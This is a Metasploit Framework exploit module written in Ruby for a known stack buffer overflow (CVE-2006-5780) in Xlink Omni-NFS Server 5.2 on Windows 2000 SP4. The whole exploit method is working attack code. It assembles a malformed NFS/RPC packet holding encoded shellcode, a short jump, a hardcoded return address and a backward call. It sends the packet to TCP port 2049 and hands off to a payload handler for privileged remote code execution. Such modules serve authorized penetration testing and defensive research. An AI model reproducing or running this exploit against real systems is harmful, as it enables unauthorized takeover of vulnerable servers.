##
# $Id: xlink_nfsd.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Omni-NFS Server Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Xlink Omni-NFS Server 5.2
				When sending a specially crafted nfs packet, an attacker may be able
				to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'CVE', '2006-5780' ],
					[ 'OSVDB', '30224'],
					[ 'BID', '20941' ],
					[ 'URL', 'http://www.securityfocus.com/data/vulnerabilities/exploits/omni-nfs-server-5.2-stackoverflow.pm' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 336,
					'BadChars' => "\x00",
					'PrepenEncoder' => "\x81\xc4\x54\xf2\xff\xff",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 SP4 English',     { 'Ret' => 0x0040bb2e } ],
				],
			'Privileged'     => true,
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 06 2006'))

		register_options([Opt::RPORT(2049)], self.class)
	end

	def exploit
		connect

		buff =  payload.encoded
		buff << Rex::Arch::X86.jmp_short(6) + rand_text_english(2)
		buff << [target.ret].pack('V')
		buff << Metasm::Shellcode.assemble(Metasm::Ia32.new, "call $-330").encode_string
		buff << rand_text_english(251)

		pkt =  [1].pack('N')
		pkt << [0].pack('N')
		pkt << [2].pack('N')
		pkt << [100005].pack('N')
		pkt << [1].pack('N')
		pkt << [1].pack('N')
		pkt << [1].pack('N')
		pkt << [400].pack('N')
		pkt << buff[0,400]
		pkt << [1].pack('N')
		pkt << [400].pack('N')
		pkt << buff[300,400]

		sploit = [pkt.length | 0x80000000].pack('N') + pkt

		print_status("Trying target #{target.name}...")
		sock.put(sploit)

		handler
		disconnect
	end

end